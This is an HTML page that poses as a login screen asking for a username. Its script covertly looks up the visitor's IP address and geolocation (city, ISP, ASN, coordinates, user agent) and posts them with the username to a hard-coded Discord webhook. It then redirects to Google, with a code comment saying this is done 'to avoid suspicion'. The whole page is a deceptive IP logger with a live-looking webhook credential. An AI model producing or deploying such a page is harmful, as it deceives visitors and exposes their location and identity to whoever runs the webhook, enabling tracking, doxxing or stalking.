<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Required</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
            color: #333;
        }
        .container {
            background: white;
            padding: 2rem;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 90%;
            text-align: center;
        }
        h1 {
            color: #4a5568;
            margin-bottom: 1rem;
            font-size: 1.8rem;
        }
        input {
            width: 100%;
            padding: 12px;
            margin: 10px 0;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 16px;
            box-sizing: border-box;
            transition: border-color 0.3s;
        }
        input:focus {
            outline: none;
            border-color: #667eea;
        }
        button {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s;
        }
        button:hover {
            transform: translateY(-2px);
        }
        button:active {
            transform: translateY(0);
        }
        .loading {
            display: none;
            color: #667eea;
            font-style: italic;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üîê Access Required</h1>
        <p>Please enter your username to continue:</p>
        <input type="text" id="username" placeholder="Enter your username" maxlength="50">
        <button onclick="logIP()">Continue ‚Üí</button>
        <div id="loading" class="loading">Logging in...</div>
    </div>

    <script>
        async function logIP() {
            const username = document.getElementById('username').value.trim();
            if (!username) {
                alert('Please enter a username');
                return;
            }

            document.getElementById('loading').style.display = 'block';
            document.querySelector('button').style.display = 'none';

            try {
                // Get accurate IP data
                const response = await fetch('https://api.ipify.org?format=json');
                const ipData = await response.json();
                
                // Get additional geolocation data
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();

                // Send to Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1477352751611777199/70Q3j6g16ZbvYMxPnarbeUs854Sgj-1E1fDzJRrHJB7UWmHGK1zY7kc3Cm6r1knkyw3P'; // Replace with your webhook
                const payload = {
                    username: 'IP Logger',
                    avatar_url: 'https://example.com/icon.png',
                    embeds: [{
                        title: 'üïµÔ∏è New Visitor Logged',
                        color: 3447003,
                        fields: [
                            { name: 'üë§ Username', value: username, inline: true },
                            { name: 'üåê IP Address', value: `\`${ipData.ip}\``, inline: true },
                            { name: 'üìç Location', value: `${geoData.city || 'N/A'}, ${geoData.region || 'N/A'}, ${geoData.country_name || 'N/A'}`, inline: false },
                            { name: 'üåç ISP', value: geoData.org || 'N/A', inline: true },
                            { name: 'üïê Time', value: new Date().toLocaleString(), inline: true },
                            { name: 'üîó User Agent', value: navigator.userAgent.slice(0, 100) + '...', inline: false }
                        ],
                        thumbnail: {
                            url: `https://flagcdn.com/32x24/${geoData.country.toLowerCase()}.png`
                        },
                        footer: { text: `ASN: ${geoData.asn || 'N/A'} | Lat/Lon: ${geoData.latitude || 'N/A'}, ${geoData.longitude || 'N/A'}` }
                    }]
                };

                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Redirect or show success
                setTimeout(() => {
                    window.location.href = 'https://google.com'; // Redirect to avoid suspicion
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                document.getElementById('loading').textContent = 'Login failed. Please try again.';
            }
        }

        // Auto-submit on Enter
        document.getElementById('username').addEventListener('keypress', function(e) {
            if (e.key === 'Enter') logIP();
        });
    </script>
</body>
</html>
